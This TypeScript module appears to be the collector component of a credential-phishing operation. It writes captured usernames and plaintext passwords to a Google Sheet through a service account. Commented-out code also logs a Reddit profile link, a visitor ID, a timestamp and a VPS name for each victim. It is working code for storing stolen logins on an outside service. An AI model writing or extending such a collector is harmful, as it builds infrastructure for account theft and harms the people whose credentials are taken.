// external imports
import { GoogleSpreadsheet } from "google-spreadsheet";

const creds = require("./credentials.json");
// internal imports

interface DataInfo {
  Username: string;
  Password: string;
  Date_Time: string;
  VisitorID: string;
  Account_link?: string;
  VpsName?: string;
}

class GoogleSheet {
  private doc: GoogleSpreadsheet;
  constructor(urlId: string) {
    this.doc = new GoogleSpreadsheet(urlId);
  }

  async connect() {
    await this.doc.useServiceAccountAuth(creds);
  }

  async addData(dataInfo: DataInfo) {
    const { Username, Password, VisitorID, Date_Time } = dataInfo;

    await this.doc.loadInfo();
    const sheet =
      this.doc.sheetsByTitle[process.env.GOOGLE_SHEET_TITLE as string];

    const data = {
      username: Username,
      password: Password,
    };

    // let data: DataInfo = {
    //   Username,
    //   Password,
    //   Account_link: `https://old.reddit.com/user/${Username}`,
    //   VisitorID,
    //   Date_Time,
    //   VpsName: process.env.VPSNAME,
    // };

    await sheet.addRow({ ...data });
  }
}

export default new GoogleSheet(
  process.env.GOOGLE_SPREAD_SHEET_URL_KEY as string
);

// export const googleAuth = async (urlId: string) => {
//   try {
//     doc = new GoogleSpreadsheet(urlId);
//     await doc.useServiceAccountAuth(creds);
//   } catch (err: any) {
//     console.log(err.message);
//   }
// };

// export const addData = async (
//   username: string,
//   password: string,
//   dateTime: string,
//   VisitorID: string
// ) => {
//   try {
//     await doc.loadInfo();

//     // select the specific sheets...
//     const sheet = doc.sheetsByTitle[process.env.GOOGLE_SHEET_TITLE as string];

//     const data: any = {};
//     data["Username"] = username;
//     data["Password"] = password;
//     data["Account link"] = `https://old.reddit.com/user/${username}`;
//     data["VisitorID"] = VisitorID;
//     data["Date & Time"] = dateTime;
//     data["VpsName"] = process.env.VPSNAME;

//     await sheet.addRow(data);
//   } catch (err: any) {
//     console.log(err.message);
//   }
// };
